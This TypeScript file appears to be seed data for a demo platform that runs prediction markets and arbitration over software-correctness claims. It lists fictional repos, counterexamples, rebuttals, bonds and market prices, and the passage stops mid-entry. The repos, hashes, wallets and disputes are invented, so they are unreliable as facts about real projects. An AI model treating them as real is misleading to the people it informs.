import { DEMO_WALLET_ADDRESS } from '../../demo'
import { fakeHash } from '../../internal/util'
import { actors, wallets } from './actors'
import type { ClaimSeed } from './build'

const NODE_SETUP = ['corepack enable', 'pnpm install --frozen-lockfile']

/** A 10,000-character unbroken token used by the hostile evidence item (tests wrapping/inert rendering). */
const UNBROKEN = 'A1b2C3d4'.repeat(1250)

export const CLAIM_SEEDS: ClaimSeed[] = [
  // -------------------------------------------------------------------------
  // PINE-0001 · settled (NO) · quarry/csv-kit · demo user verifying a dependency
  // -------------------------------------------------------------------------
  {
    number: 1,
    repo: 'quarry/csv-kit',
    pr: 140,
    creator: wallets.mara,
    policyId: 'FUNC-001',
    claimClass: 'format-conformance',
    title: 'csv-kit batch reader follows RFC 4180 quoted-field rules',
    requirement:
      'For every input that conforms to RFC 4180 §2 rules 5–7 (quoted fields containing commas, CRLF line breaks and escaped double quotes), `ReaderBuilder::new().has_headers(false).from_reader(input).byte_records()` yields exactly the fields defined by the RFC 4180 ABNF grammar.',
    violation:
      'an RFC 4180-conforming input for which the csv-kit batch reader yields fields that differ from the RFC 4180 ABNF grammar',
    scope: {
      inScope: ['src/reader.rs — ReaderBuilder and byte_records()', 'Inputs conforming to RFC 4180 §2 rules 1–7'],
      outOfScope: ['src/stream.rs (streaming reader)', 'Non-conforming inputs (e.g. bare quotes in unquoted fields)', 'Performance'],
    },
    parameters: {
      expectedBehavior: 'Fields equal those produced by the RFC 4180 ABNF grammar for every conforming input.',
      inputDomain: 'Any byte sequence that conforms to RFC 4180 §2 rules 1–7, up to 1 MiB.',
      supportedEnvironment: 'Rust 1.82.0 stable on Linux x64, Cargo.lock as pinned.',
      featureBoundaries: ['ReaderBuilder::from_reader', 'Reader::byte_records'],
      configuration: 'has_headers=false; all other builder options default.',
      violationScope: 'any',
    },
    allowedInputs: 'RFC 4180-conforming byte sequences up to 1 MiB.',
    assumptions: ['Default delimiter (`,`) and quote (`"`) characters.', 'Input is read fully into memory before parsing.'],
    exclusions: ['Inputs that do not conform to RFC 4180.', 'The streaming reader in src/stream.rs.', 'Memory or speed limits.'],
    env: {
      runtime: 'rustc 1.82.0 (stable)',
      packageManager: 'cargo 1.82.0',
      lockPath: 'Cargo.lock',
      config: { HAS_HEADERS: 'false', DELIMITER: ',', QUOTE: '"' },
      externalState: 'none',
      reproductionCommand: 'cargo test --test rfc4180 -- --nocapture',
      setupSteps: ['rustup toolchain install 1.82.0', 'cargo fetch --locked'],
    },
    createdH: -1000,
    deadlineH: -832,
    minBond: '5',
    status: 'settled',
    outcome: 'no',
    market: { initial: 0.12, yes: 0.004, preResolution: 0.03, invalid: 0.004, liquidity: '0', volume: '412.8', volume24h: '0', traders: 9, trades: 5 },
    answers: [{ answer: 'no', bond: '5', by: actors.answerDesk, h: -820 }],
    finalizedH: -736,
    evidence: [
      {
        kind: 'counterexample',
        title: 'Bare quote inside an unquoted field is split into two fields',
        summary:
          'Input `a,b"c,d\\r\\n` produces 4 fields instead of 3.\n\nNote: I am aware the input may be outside RFC 4180 rule 5; submitting in case the maintainers consider it in scope.',
        by: actors.diffbot,
        h: -900,
        reproduction: {
          command: 'cargo test --test pine_0001 -- bare_quote',
          environment: 'rustc 1.82.0, Cargo.lock as pinned',
          expected: '3 fields: ["a", "b\\"c", "d"]',
          actual: '4 fields: ["a", "b", "c", "d"]',
        },
        jump: 0.4,
      },
      {
        kind: 'rebuttal',
        title: 'The input is not RFC 4180-conforming (rule 5)',
        summary:
          'RFC 4180 §2 rule 5: "If fields are not enclosed with double quotes, then double quotes may not appear inside the fields." The input violates rule 5, which the claim excludes. No conforming input was shown to diverge from the grammar.',
        by: wallets.mara,
        h: -880,
        jump: -0.9,
      },
    ],
    funding: { liquidity: '150', spendingLimit: '180' },
    withdrawnH: -720,
    withdrawnAmount: '58.9',
    redeemedH: -719,
    redeemedAmount: '71.4',
    tags: ['parser', 'rust', 'rfc4180', 'dependency'],
  },

  // -------------------------------------------------------------------------
  // PINE-0002 · resolved YES · acme-labs/fastparse
  // -------------------------------------------------------------------------
  {
    number: 2,
    repo: 'acme-labs/fastparse',
    pr: 212,
    withBase: true,
    creator: wallets.li,
    policyId: 'FUNC-001',
    claimClass: 'format-conformance',
    title: 'fastparse strict mode rejects numbers with leading zeros',
    requirement:
      'With `{ strict: true }`, `parse(input)` throws `SyntaxError` for every JSON text containing a number whose integer part has a leading zero followed by another digit, with or without a minus sign (RFC 8259 §6).',
    violation:
      'an input containing a number with a leading zero (RFC 8259 §6) that `parse(input, { strict: true })` accepts without throwing',
    scope: {
      inScope: ['src/numbers.ts', 'src/parse.ts strict-mode number handling'],
      outOfScope: ['JSON5 (non-strict) mode', 'Numbers inside string literals'],
    },
    parameters: {
      expectedBehavior: 'parse(input, { strict: true }) throws SyntaxError for leading-zero numbers such as 01, -01, 00.5.',
      inputDomain: 'Any UTF-8 JSON text up to 64 KiB.',
      supportedEnvironment: 'Node 22.14.0 on Linux x64, pnpm-lock.yaml as pinned.',
      featureBoundaries: ['parse(input, { strict: true })'],
      configuration: 'strict=true; all other options default.',
      violationScope: 'any',
    },
    allowedInputs: 'UTF-8 JSON texts up to 64 KiB.',
    assumptions: ['Inputs are passed as JavaScript strings.'],
    exclusions: ['Non-strict (JSON5) mode.', 'Error message wording.', 'Inputs larger than 64 KiB.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { STRICT: 'true' },
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/strict-numbers.test.ts',
      setupSteps: NODE_SETUP,
    },
    createdH: -770,
    deadlineH: -602,
    minBond: '10',
    status: 'resolved',
    outcome: 'yes',
    market: { initial: 0.1, yes: 0.995, preResolution: 0.93, invalid: 0.003, liquidity: '64.2', volume: '1284.5', volume24h: '0', traders: 23, trades: 8 },
    answers: [{ answer: 'yes', bond: '10', by: actors.answerDesk, h: -590 }],
    finalizedH: -506,
    evidence: [
      {
        kind: 'counterexample',
        title: '`-00.5` is accepted in strict mode',
        summary:
          'The leading-zero check matches `/^-?0[1-9]/`, so a minus sign followed by **two** zeros slips through. `parse("[-00.5]", { strict: true })` returns `[-0.5]` instead of throwing.\n\nReproduction test added as `test/pine-0002.test.ts`; it fails on the pinned commit and passes when the check is changed to `/^-?0\\d/`.',
        by: actors.fuzzwright,
        h: -700,
        reproduction: {
          command: 'pnpm vitest run test/pine-0002.test.ts',
          environment: 'node 22.14.0, pnpm 10.9.2, lockfile as pinned',
          expected: 'SyntaxError: Unexpected leading zero at 1:3',
          actual: '[ -0.5 ]',
          steps: ['Check out the pinned commit', 'Copy test/pine-0002.test.ts from the evidence package', 'Run the command'],
        },
        attachments: [
          { name: 'pine-0002.test.ts', mime: 'text/typescript', size: 812 },
          { name: 'vitest-output.txt', mime: 'text/plain', size: 2310 },
        ],
        jump: 2.6,
      },
      {
        kind: 'clarification',
        title: 'Maintainers reproduced the counterexample; fix tracked in #219',
        summary:
          'We reproduced `-00.5` on the pinned commit. This claim is about the pinned commit only, so the fix in #219 does not change this market. Thanks to the submitter.',
        by: wallets.li,
        h: -690,
        jump: 0.6,
      },
    ],
    funding: { liquidity: '120', spendingLimit: '150' },
    demoTrades: [{ h: -705, by: DEMO_WALLET_ADDRESS, outcome: 'yes', side: 'buy', amount: '9.24' }],
    tags: ['parser', 'json', 'strict-mode'],
  },

  // -------------------------------------------------------------------------
  // PINE-0003 · resolved NO · harbor/rate-limiter
  // -------------------------------------------------------------------------
  {
    number: 3,
    repo: 'harbor/rate-limiter',
    pr: 77,
    creator: wallets.jonas,
    policyId: 'FUNC-001',
    claimClass: 'bug-fix',
    title: 'Sliding-window limiter admits at most N requests per window per key',
    requirement:
      'For a limiter configured with `Limit=N` and `Window=W` on the in-memory and Redis backends, for any key and any interval of length W measured on the monotonic clock, at most N calls to `Allow(key)` return true.',
    violation: 'more than N successful `Allow(key)` calls for a single key within one window of length W on the monotonic clock',
    scope: {
      inScope: ['window/log.go', 'window/clock.go', 'In-memory and single-primary Redis backends'],
      outOfScope: ['Token bucket backend', 'Redis Cluster / failover', 'Wall-clock adjustments'],
    },
    parameters: {
      expectedBehavior: 'At most N Allow(key)==true per key per window W (monotonic clock).',
      inputDomain: 'Any key; any request schedule from up to 256 goroutines; N in 1..10,000; W in 1s..1h.',
      supportedEnvironment: 'Go 1.23.4 on Linux x64; Redis 7.4 single primary.',
      featureBoundaries: ['window.New', 'Limiter.Allow'],
      configuration: 'BACKEND=memory or redis; REDIS_MODE=single',
      violationScope: 'any',
    },
    faultModel: 'Concurrent callers within stated limits; process restart of the limiter host is out of scope.',
    assumptions: ['The monotonic clock never goes backwards.', 'Redis persistence is not relied on.'],
    exclusions: ['Wall-clock (NTP) adjustments.', 'Redis failover with data loss.', 'More than one Redis primary.'],
    env: {
      runtime: 'go 1.23.4',
      lockPath: 'go.sum',
      config: { BACKEND: 'memory|redis', REDIS_MODE: 'single', REDIS_VERSION: '7.4.1' },
      containerImage: 'redis:7.4.1@sha256:1f0c5a1e8b4a1d2b9e0d3f7c8a6b5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f',
      externalState: 'none',
      reproductionCommand: 'go test ./window/... -run TestWindowInvariant -count=1 -race',
      setupSteps: ['docker run -d -p 6379:6379 redis:7.4.1', 'go mod download'],
    },
    createdH: -690,
    deadlineH: -522,
    minBond: '10',
    status: 'resolved',
    outcome: 'no',
    market: { initial: 0.2, yes: 0.004, preResolution: 0.05, invalid: 0.004, liquidity: '210', volume: '956.3', volume24h: '0', traders: 17, trades: 7 },
    answers: [{ answer: 'no', bond: '10', by: actors.heron, h: -515 }],
    finalizedH: -431,
    evidence: [
      {
        kind: 'counterexample',
        title: 'N+1 admissions after an NTP step backwards',
        summary:
          'Stepping the system clock back by 2s during a window admits N+1 requests in the Redis backend, because the Redis script uses `TIME` from the server.',
        by: actors.kestrel,
        h: -560,
        reproduction: {
          command: 'go test ./window/... -run TestNTPStep -count=1',
          environment: 'go 1.23.4, redis 7.4.1, faketime',
          expected: '100 admissions',
          actual: '101 admissions',
        },
        jump: 0.8,
      },
      {
        kind: 'rebuttal',
        title: 'Relies on a wall-clock step, which is excluded',
        summary:
          'The claim measures windows on the monotonic clock and lists "Wall-clock (NTP) adjustments" as an exclusion. The Redis `TIME` path is a wall-clock source. This does not demonstrate the stated violation.',
        by: wallets.jonas,
        h: -548,
        jump: -1.2,
      },
    ],
    funding: { liquidity: '250', spendingLimit: '300' },
    tags: ['go', 'rate-limiting', 'concurrency'],
  },

  // -------------------------------------------------------------------------
  // PINE-0004 · resolved INVALID (question ambiguity) · meshwire/webhook-relay
  // -------------------------------------------------------------------------
  {
    number: 4,
    repo: 'meshwire/webhook-relay',
    pr: 301,
    creator: wallets.akosua,
    policyId: 'FUNC-001',
    claimClass: 'bug-fix',
    title: 'Webhook relay delivers each event at most once per subscriber',
    requirement:
      'For any subscriber and event id, the relay performs at most one HTTP delivery attempt that reaches the subscriber endpoint.',
    violation: 'two HTTP deliveries of the same event id that reach the same subscriber endpoint',
    scope: {
      inScope: ['src/deliver.ts', 'src/ledger.ts', 'src/retry.ts'],
      outOfScope: ['Subscriber-side deduplication', 'Signing'],
    },
    parameters: {
      expectedBehavior: 'At most one delivery per (subscriber, event id).',
      inputDomain: 'Any event stream; subscriber endpoints that may time out or return 5xx.',
      supportedEnvironment: 'Node 22.14.0, Postgres 16.4.',
      featureBoundaries: ['deliver()', 'retry queue'],
      configuration: 'DELIVERY_MODE=at_least_once; RETRY_MAX=5',
      violationScope: 'any',
    },
    faultModel: 'Subscriber timeouts and 5xx responses; relay process restart.',
    assumptions: ['Postgres is available.'],
    exclusions: ['Duplicate events published upstream with different ids.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { DELIVERY_MODE: 'at_least_once', RETRY_MAX: '5', RETRY_BASE_MS: '500' },
      containerImage: 'postgres:16.4@sha256:7c1e4f2a9b3d5e6f8a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f',
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/delivery.test.ts',
      setupSteps: [...NODE_SETUP, 'docker compose up -d postgres'],
    },
    createdH: -600,
    deadlineH: -432,
    minBond: '5',
    status: 'resolved',
    outcome: 'invalid',
    resolutionNote:
      'Resolved invalid due to question ambiguity: the pinned configuration sets DELIVERY_MODE=at_least_once, under which a retry after a subscriber timeout is documented behavior, while the requirement promises at-most-once delivery. Answerers could not determine whether a duplicate caused by documented at-least-once retries violates the claim, so the question was answered invalid and that answer stood. Invalid is not a refund: only “Invalid result” tokens redeem (1 sDAI each); YES and NO tokens pay nothing. The claim was re-filed as PINE-0017 with DELIVERY_MODE=at_most_once.',
    market: { initial: 0.25, yes: 0.004, preResolution: 0.55, invalid: 0.99, liquidity: '38', volume: '402.1', volume24h: '0', traders: 11, trades: 6 },
    answers: [
      { answer: 'yes', bond: '5', by: actors.marlow, h: -425 },
      { answer: 'invalid', bond: '10', by: actors.heron, h: -410 },
    ],
    finalizedH: -326,
    evidence: [
      {
        kind: 'counterexample',
        title: 'Subscriber timeout after receipt causes a second delivery',
        summary:
          'Subscriber accepts the body, then times out before responding. With the pinned DELIVERY_MODE=at_least_once, the retry queue delivers the same event id again 500 ms later. Both requests reach the endpoint.',
        by: actors.marlow,
        h: -470,
        reproduction: {
          command: 'pnpm vitest run test/pine-0004.test.ts',
          environment: 'node 22.14.0, postgres 16.4, pinned config',
          expected: '1 request for evt_01J9',
          actual: '2 requests for evt_01J9',
        },
        jump: 1.4,
      },
      {
        kind: 'clarification',
        title: 'Pinned configuration is at_least_once by mistake',
        summary:
          'We pinned the default config file instead of the at_most_once profile. We cannot change the frozen terms. We will re-file with DELIVERY_MODE=at_most_once.',
        by: wallets.akosua,
        h: -440,
      },
    ],
    funding: { liquidity: '100', spendingLimit: '120' },
    tags: ['webhooks', 'idempotency', 'question-ambiguity'],
  },

  // -------------------------------------------------------------------------
  // PINE-0005 · arbitration (Kleros, appeal period) · northwind/auth-gateway
  // -------------------------------------------------------------------------
  {
    number: 5,
    repo: 'northwind/auth-gateway',
    pr: 388,
    creator: wallets.sofia,
    policyId: 'FUNC-001',
    claimClass: 'access-boundary',
    title: "Export jobs never return another user's private document",
    requirement:
      'An authenticated user U cannot obtain the content of a private document owned by user V (V ≠ U, with no active share to U at the time content is returned) through `GET /v2/documents/{id}`, `POST /v2/exports` or `GET /v2/exports/{jobId}/download`.',
    violation:
      "an authenticated user obtaining the content of another user's private document without an active share through GET /v2/documents/{id}, POST /v2/exports or GET /v2/exports/{jobId}/download",
    scope: {
      inScope: ['GET /v2/documents/{id}', 'POST /v2/exports', 'GET /v2/exports/{jobId}/download', 'internal/acl', 'internal/export'],
      outOfScope: ['Admin and support roles', 'Search endpoints (see PINE-0014)', 'Infrastructure access'],
    },
    parameters: {
      expectedBehavior: 'Document content is returned only to the owner or an active share recipient at the time content is returned.',
      inputDomain: 'Any authenticated non-admin session; any document id; any sequence of share/revoke operations through the public API.',
      supportedEnvironment: 'Go 1.23.4, Postgres 16.4, docker compose stack as pinned.',
      featureBoundaries: ['GET /v2/documents/{id}', 'POST /v2/exports', 'GET /v2/exports/{jobId}/download'],
      configuration: 'SHARING_ENABLED=true, ACL_CACHE_TTL=0, EXPORT_WORKERS=2',
      violationScope: 'any',
    },
    faultModel: 'Concurrent API calls from up to 4 sessions; export worker restarts.',
    assumptions: ['Sessions are obtained through the public OAuth flow.', 'Database and object store are not tampered with.'],
    exclusions: ['Admin or support roles.', 'Stolen session tokens.', 'Direct database or object-store access.'],
    env: {
      runtime: 'go 1.23.4',
      lockPath: 'go.sum',
      config: { SHARING_ENABLED: 'true', ACL_CACHE_TTL: '0', EXPORT_WORKERS: '2' },
      containerImage: 'ghcr.io/northwind/auth-gateway-dev@sha256:3b9d2f1e0c8a7b6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d',
      externalState: 'Fresh database seeded by scripts/seed-dev.sql',
      reproductionCommand: 'make e2e TEST=./e2e/acl_test.go',
      setupSteps: ['docker compose up -d', 'make seed'],
    },
    createdH: -508,
    deadlineH: -340,
    minBond: '10',
    status: 'arbitration',
    market: { initial: 0.18, yes: 0.71, invalid: 0.03, liquidity: '520', volume: '3940.2', volume24h: '214.6', traders: 41, trades: 9 },
    answers: [
      { answer: 'yes', bond: '10', by: actors.marlow, h: -330 },
      { answer: 'no', bond: '20', by: actors.answerDesk, h: -322 },
      { answer: 'yes', bond: '40', by: actors.marlow, h: -312 },
    ],
    arbitration: {
      requested: true,
      requestedH: -306,
      requester: wallets.sofia,
      disputeId: '1642',
      court: 'General Court (31 jurors)',
      cost: '0.1674',
      status: 'appeal_period',
      ruling: 'yes',
      rulingH: -62,
      appealDeadlineH: 46,
    },
    evidence: [
      {
        kind: 'counterexample',
        title: 'Revoked share still exports through a queued job',
        summary:
          'V shares doc D with U. U calls POST /v2/exports for D. V revokes the share while the job is queued. The worker runs after the revocation and GET /v2/exports/{jobId}/download returns D’s content to U.\n\nAt the time content is returned, U has no active share, which the requirement covers explicitly.',
        by: actors.marlow,
        h: -450,
        reproduction: {
          command: 'make e2e TEST=./e2e/pine_0005_test.go',
          environment: 'pinned compose stack, EXPORT_WORKERS=2, worker paused with SIGSTOP between enqueue and run',
          expected: '403 on download after revocation',
          actual: '200 with document body (sha256 9f1c…e2)',
          steps: ['Seed users U and V', 'V shares D with U', 'U enqueues export', 'V revokes share', 'Resume worker', 'U downloads export'],
        },
        attachments: [{ name: 'pine_0005_test.go', mime: 'text/x-go', size: 4120 }, { name: 'e2e-run.log', mime: 'text/plain', size: 18_442 }],
        jump: 1.9,
      },
      {
        kind: 'rebuttal',
        title: 'Pausing the worker with SIGSTOP is outside the fault model',
        summary:
          'The fault model allows worker restarts, not suspending a worker mid-job. Without SIGSTOP the job runs within ~40 ms and the race is not reachable through the public API.',
        by: wallets.sofia,
        h: -420,
        jump: -0.5,
      },
      {
        kind: 'clarification',
        title: 'Same race reproduced with a worker restart instead of SIGSTOP',
        summary:
          'Replaced SIGSTOP with `docker compose restart export-worker` between enqueue and run (an allowed fault). The queued job is picked up after restart and the download still returns D. Updated test attached.',
        by: actors.marlow,
        h: -380,
        attachments: [{ name: 'pine_0005_restart_test.go', mime: 'text/x-go', size: 4388 }],
        jump: 0.7,
      },
    ],
    funding: { liquidity: '500', spendingLimit: '600' },
    demoTrades: [{ h: -400, by: DEMO_WALLET_ADDRESS, outcome: 'yes', side: 'buy', amount: '18.5' }],
    tags: ['authz', 'multi-tenant', 'kleros-dispute'],
  },

  // -------------------------------------------------------------------------
  // PINE-0006 · disputed (bonds doubling) · orbit-dao/nonce-manager
  // -------------------------------------------------------------------------
  {
    number: 6,
    repo: 'orbit-dao/nonce-manager',
    pr: 63,
    creator: wallets.priya,
    policyId: 'BOT-001',
    claimClass: 'nonce-allocation',
    title: 'Fenced nonce leases never hand out the same nonce twice',
    requirement:
      'For one sender account and up to 8 concurrent workers, no two transactions signed through `LeaseManager.sign()` use the same nonce, under RPC timeouts and worker restarts.',
    violation: 'two transactions signed through LeaseManager.sign() for the same account with the same nonce',
    scope: {
      inScope: ['src/lease.ts', 'src/reconcile.ts', 'src/store/redis.ts'],
      outOfScope: ['Transactions sent by processes that do not use the lease manager', 'Chain reorgs deeper than 1 block'],
    },
    parameters: {
      invariant: 'No nonce is leased to two signers at once for the same account.',
      sourceRequirement: 'README §Guarantees, PR #63 description',
      permittedStartingStates: 'Fresh Redis; account with 0–50 pending transactions on an anvil fork.',
      reachability: 'States must be reached through the public LeaseManager API and allowed faults.',
      accounts: ['one sender EOA'],
      chains: ['anvil fork of Gnosis'],
      routes: [],
      accountingCategories: [],
      faultModel: ['timeout', 'rpc_error', 'process_crash', 'concurrent_runs'],
      simulatedAdapters: ['anvil JSON-RPC with injected latency'],
      realIntegrationEvidence: 'Not required; anvil fork evidence is sufficient for this claim.',
    },
    faultModel: 'RPC timeouts and dropped responses; worker process crash/restart; up to 8 concurrent workers. Replacement transactions by external processes are excluded.',
    assumptions: ['Redis is a single primary with AOF enabled.', 'Clock skew between workers < 500 ms.'],
    exclusions: ['Replacement transactions submitted outside the lease manager.', 'Redis data loss.', 'Live transactions on any public network.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { WORKERS: '8', LEASE_TTL_MS: '15000', RPC_TIMEOUT_MS: '4000', REDIS_AOF: 'everysec' },
      containerImage: 'ghcr.io/foundry-rs/foundry:v1.0.0@sha256:5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b',
      externalState: 'anvil fork of Gnosis at block 41,950,000',
      reproductionCommand: 'pnpm vitest run test/concurrency.test.ts',
      setupSteps: [...NODE_SETUP, 'docker compose up -d redis anvil'],
    },
    createdH: -318,
    deadlineH: -150,
    minBond: '10',
    status: 'disputed',
    market: { initial: 0.15, yes: 0.48, invalid: 0.03, liquidity: '760', volume: '5210.75', volume24h: '388.2', traders: 52, trades: 10 },
    answers: [
      { answer: 'no', bond: '10', by: actors.answerDesk, h: -140 },
      { answer: 'yes', bond: '20', by: actors.kestrel, h: -100 },
      { answer: 'no', bond: '40', by: actors.answerDesk, h: -60 },
      { answer: 'yes', bond: '80', by: actors.kestrel, h: -10 },
    ],
    evidence: [
      {
        kind: 'counterexample',
        title: 'Duplicate nonce after RPC timeout and lease expiry',
        summary:
          'Worker A leases nonce 17 and signs; `eth_sendRawTransaction` times out (response dropped, tx actually in mempool). The lease expires after 15 s. Reconcile reads `eth_getTransactionCount(pending)` from a lagging RPC node that has not seen the tx, returns 17 to the pool, and worker B signs a different tx with nonce 17.',
        by: actors.kestrel,
        h: -200,
        reproduction: {
          command: 'pnpm vitest run test/pine-0006.test.ts',
          environment: 'anvil fork + toxiproxy dropping responses; 2 RPC upstreams, one lagging 3 blocks',
          expected: 'nonce 17 never re-leased while a tx with nonce 17 is pending',
          actual: 'two signed txs with nonce 17 (hashes 0x4e1…, 0x9a7…)',
        },
        attachments: [{ name: 'pine-0006.test.ts', mime: 'text/typescript', size: 6020 }],
        jump: 1.3,
      },
      {
        kind: 'rebuttal',
        title: 'Lagging RPC upstream is a replacement-transaction scenario',
        summary:
          'The duplicate only lands because the second tx replaces the first in the mempool. Replacement transactions are excluded by the fault model.',
        by: wallets.priya,
        h: -175,
        jump: -0.6,
      },
      {
        kind: 'clarification',
        title: 'Both transactions are signed by the lease manager itself',
        summary:
          'Neither transaction comes from an external process. The violation is that LeaseManager.sign() produced two signatures with nonce 17, which is the stated violation, whether or not one later replaces the other.',
        by: actors.kestrel,
        h: -160,
        jump: 0.3,
      },
    ],
    funding: { liquidity: '750', spendingLimit: '900' },
    demoTrades: [{ h: -60, by: DEMO_WALLET_ADDRESS, outcome: 'no', side: 'buy', amount: '22' }],
    tags: ['nonce', 'concurrency', 'evm', 'disputed'],
  },

  // -------------------------------------------------------------------------
  // PINE-0007 · answer proposed · tidewater/payroll-scheduler
  // -------------------------------------------------------------------------
  {
    number: 7,
    repo: 'tidewater/payroll-scheduler',
    pr: 91,
    creator: wallets.jonas,
    policyId: 'BOT-001',
    claimClass: 'duplicate-operations',
    title: 'No payroll payout is dispatched twice after a crash',
    requirement:
      'For any approved batch, each (batch id, employee id, period) payout is dispatched to an adapter at most once, including when the scheduler process is killed with SIGKILL at any point and restarted.',
    violation: 'the same (batch id, employee id, period) payout dispatched to an adapter twice after a SIGKILL and restart',
    scope: {
      inScope: ['scheduler/journal.py', 'scheduler/dispatch.py', 'scheduler/recover.py'],
      outOfScope: ['Bank-side duplicate detection', 'Adapters that ignore idempotency keys'],
    },
    parameters: {
      invariant: 'At most one dispatch per idempotency key.',
      sourceRequirement: 'docs/recovery.md §3',
      permittedStartingStates: 'Any journal produced by the scheduler itself from an approved batch of up to 500 payouts.',
      reachability: 'States reached by running the scheduler and sending SIGKILL at arbitrary points.',
      accounts: ['simulated bank adapter', 'simulated on-chain adapter'],
      chains: [],
      routes: [],
      accountingCategories: [],
      faultModel: ['process_crash', 'timeout'],
      simulatedAdapters: ['bank adapter (in-memory)', 'on-chain adapter (anvil)'],
      realIntegrationEvidence: 'Not required.',
    },
    faultModel: 'SIGKILL of the scheduler process at any instruction; adapter timeouts. Power loss with unflushed SQLite WAL pages is excluded.',
    assumptions: ['SQLite WAL with synchronous=FULL.', 'Adapters honor idempotency keys.'],
    exclusions: ['Power loss or disk corruption.', 'Manual journal edits.', 'Real bank or chain transfers.'],
    env: {
      runtime: 'python 3.12.7',
      packageManager: 'uv 0.5.4',
      lockPath: 'uv.lock',
      config: { SQLITE_SYNCHRONOUS: 'FULL', DISPATCH_CONCURRENCY: '4', RETRY_MAX: '3' },
      externalState: 'none',
      reproductionCommand: 'uv run pytest tests/test_crash_recovery.py -q',
      setupSteps: ['uv sync --frozen'],
    },
    createdH: -185,
    deadlineH: -17,
    minBond: '10',
    status: 'answer_proposed',
    market: { initial: 0.12, yes: 0.07, invalid: 0.02, liquidity: '300', volume: '640.4', volume24h: '41.9', traders: 14, trades: 6 },
    answers: [{ answer: 'no', bond: '10', by: actors.answerDesk, h: -8 }],
    evidence: [
      {
        kind: 'clarification',
        title: 'Crash model is SIGKILL only',
        summary: 'Several people asked about power loss. The fault model is SIGKILL at any point; unflushed WAL pages after power loss are excluded.',
        by: wallets.jonas,
        h: -150,
      },
      {
        kind: 'commitment',
        title: 'Commitment 0x6c4e…91af (not revealed)',
        summary: 'Commit-reveal submission. The evidence package has not been revealed; an unrevealed commitment is not admissible evidence on its own.',
        by: actors.diffbot,
        h: -40,
        commitment: { revealed: false, hash: fakeHash('commitment:7:diffbot') },
        jump: 0.3,
      },
    ],
    funding: { liquidity: '300', spendingLimit: '350' },
    tags: ['payroll', 'idempotency', 'crash-recovery'],
  },

  // -------------------------------------------------------------------------
  // PINE-0008 · awaiting answer · lumen-ai/agent-patchbot (agent-authored PR)
  // -------------------------------------------------------------------------
  {
    number: 8,
    repo: 'lumen-ai/agent-patchbot',
    pr: 1408,
    withBase: true,
    creator: wallets.priya,
    policyId: 'FUNC-001',
    claimClass: 'bug-fix',
    title: 'Agent patch fixes hunk counts for files without a trailing newline',
    requirement:
      'For any text file whose last line lacks a trailing newline, the unified diff produced by `createPatch(old, new)` applies cleanly with `git apply --check` (git 2.47.1) for add, delete and modify edits of that last line.',
    violation:
      'a file without a trailing newline and an add, delete or modify edit of its last line for which the patch from createPatch() fails `git apply --check`',
    scope: {
      inScope: ['src/diff/unified.ts — createPatch()'],
      outOfScope: ['Binary files', 'Patches over 10,000 lines', 'Agent search behavior'],
    },
    parameters: {
      expectedBehavior: '`git apply --check` exits 0 for the generated patch.',
      inputDomain: 'UTF-8 text files up to 10,000 lines with LF or CRLF line endings, last line without newline.',
      supportedEnvironment: 'Node 22.14.0, git 2.47.1, Linux x64.',
      featureBoundaries: ['createPatch(old, new)'],
      configuration: 'context=3; all other options default.',
      violationScope: 'any',
    },
    allowedInputs: 'UTF-8 text files up to 10,000 lines, last line without a trailing newline.',
    assumptions: ['git is invoked with default config (`core.autocrlf=false`).'],
    exclusions: ['Binary files.', 'Whitespace-only differences in error output.'],
    env: {
      runtime: 'node 22.14.0',
      packageManager: 'pnpm 10.9.2',
      lockPath: 'pnpm-lock.yaml',
      config: { DIFF_CONTEXT: '3', GIT_VERSION: '2.47.1', CORE_AUTOCRLF: 'false' },
      externalState: 'none',
      reproductionCommand: 'pnpm vitest run test/diff/no-eol.test.ts',
      setupSteps: [...NODE_SETUP, 'git --version  # expect 2.47.1'],
    },
    createdH: -220,
    deadlineH: -5,
    minBond: '10',
    status: 'awaiting_answer',
    market: { initial: 0.2, yes: 0.58, invalid: 0.02, liquidity: '180', volume: '1422.9', volume24h: '96.3', traders: 28, trades: 8 },
    evidence: [
      {
        kind: 'counterexample',
        title: 'Deleting the only line of a one-line file still produces a bad header',
        summary:
          'For a file containing exactly `x` (no newline) and an edit that deletes it, createPatch emits `@@ -1,2 +0,0 @@`. `git apply --check` fails with "corrupt patch at line 5". The fix handles modify but not delete-only hunks.',
        by: actors.fuzzwright,
        h: -60,
        reproduction: {
          command: 'pnpm vitest run test/pine-0008.test.ts',
          environment: 'node 22.14.0, git 2.47.1',
          expected: '`git apply --check` exits 0',
          actual: 'error: corrupt patch at line 5 (exit 128)',
        },
        attachments: [{ name: 'pine-0008.test.ts', mime: 'text/typescript', size: 1490 }],
        jump: 1.6,
      },
      {
        kind: 'counterexample',
        title: 'CRLF file without trailing newline, modify last line',
        summary:
          'Second case found after the deadline: CRLF endings plus a missing final newline. Submitted for the maintainers; it is not timely for this market.',
        by: actors.diffbot,
        h: -2,
        reproduction: {
          command: 'pnpm vitest run test/pine-0008-crlf.test.ts',
          environment: 'node 22.14.0, git 2.47.1',
          expected: 'exit 0',
          actual: 'error: patch failed: a.txt:3 (exit 1)',
        },
      },
    ],
    funding: { liquidity: '200', spendingLimit: '240' },
    tags: ['agent-authored-pr', 'diff', 'bug-fix'],
  },

  // -------------------------------------------------------------------------
  // PINE-0009 · OPEN · FLAGSHIP · kleros/gateway-balancer-bot
  // -------------------------------------------------------------------------
  {
    number: 9,
    repo: 'kleros/gateway-balancer-bot',
    pr: 47,
    withBase: true,
    creator: wallets.mara,
    policyId: 'BOT-001',
    claimClass: 'fund-separation',
    title: 'Reporter deposits never draw principal from arbitration or gas reserves',
    requirement:
